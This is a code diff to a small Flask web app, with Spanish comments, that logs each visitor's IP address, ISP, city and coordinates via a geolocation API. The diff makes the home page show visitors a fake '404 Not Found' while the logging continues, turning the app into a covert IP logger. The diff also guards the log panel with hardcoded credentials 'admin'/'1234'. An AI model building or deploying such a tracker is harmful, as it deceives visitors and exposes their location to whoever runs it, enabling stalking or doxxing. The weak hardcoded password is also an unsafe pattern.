@@ -1,4 +1,4 @@
-from flask import Flask, request
+from flask import Flask, request, Response
 from datetime import datetime
 import requests
 import os
@@ -7,13 +7,36 @@ app = Flask(__name__)
 
 visitas = []
 
-# 🔹 Obtener IP real (funciona con Render/proxy)
+# 🔐 Credenciales (cámbialas)
+USUARIO = "admin"
+PASSWORD = "1234"
+
+# 🔹 Auth básica
+def check_auth(username, password):
+    return username == USUARIO and password == PASSWORD
+
+def authenticate():
+    return Response(
+        'Acceso restringido', 401,
+        {'WWW-Authenticate': 'Basic realm="Login requerido"'}
+    )
+
+def require_auth(f):
+    def decorated(*args, **kwargs):
+        auth = request.authorization
+        if not auth or not check_auth(auth.username, auth.password):
+            return authenticate()
+        return f(*args, **kwargs)
+    decorated.__name__ = f.__name__
+    return decorated
+
+# 🔹 Obtener IP real
 def obtener_ip_real():
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     ip = ip.split(',')[0].strip()
     return ip
 
-# 🔹 Obtener info de la IP
+# 🔹 Info IP
 def obtener_info_ip(ip):
     try:
         res = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
@@ -33,18 +56,13 @@ def obtener_info_ip(ip):
             "lon": 0
         }
 
-# 🔹 Página principal
+# 🔹 Página principal (404)
 @app.route("/")
 def inicio():
     ip = obtener_ip_real()
-
-    # Tipo de IP
     tipo = "IPv6" if ":" in ip else "IPv4"
-
     fecha = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     info = obtener_info_ip(ip)
-
-    mapa = f"https://www.google.com/maps?q={info['lat']},{info['lon']}"
 
     visitas.append({
         "ip": ip,
@@ -54,21 +72,17 @@ def inicio():
         "ciudad": info["ciudad"],
         "isp": info["isp"],
         "lat": info["lat"],
-        "lon": info["lon"],
-        "mapa": mapa
+        "lon": info["lon"]
     })
 
-    return f"""
-    <h1>Bienvenido</h1>
-    <p><b>IP:</b> {ip}</p>
-    <p><b>Tipo:</b> {tipo}</p>
-    <p><b>Ubicación:</b> {info['ciudad']}, {info['pais']}</p>
-    <p><b>Coordenadas:</b> {info['lat']}, {info['lon']}</p>
-    <p><a href="{mapa}" target="_blank">🌎 Ver en mapa</a></p>
-    """
+    return """
+    <h1>404 Not Found</h1>
+    <p>La página que buscas no existe.</p>
+    """, 404
 
-# 🔹 Panel admin
+# 🔐 Panel protegido
 @app.route("/admin")
+@require_auth
 def admin():
     tabla = ""
 
@@ -82,12 +96,11 @@ def admin():
             <td>{v['ciudad']}</td>
             <td>{v['isp']}</td>
             <td>{v['lat']}, {v['lon']}</td>
-            <td><a href="{v['mapa']}" target="_blank">Ver</a></td>
         </tr>
         """
 
     return f"""
-    <h1>Panel PRO 😎</h1>
+    <h1>Panel Privado 🔐</h1>
     <table border="1">
         <tr>
             <th>IP</th>
@@ -97,11 +110,11 @@ def admin():
             <th>Ciudad</th>
             <th>ISP</th>
             <th>Coordenadas</th>
-            <th>Mapa</th>
         </tr>
         {tabla}
     </table>
     """
 
+# 🔥 IMPORTANTE PARA RENDER
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
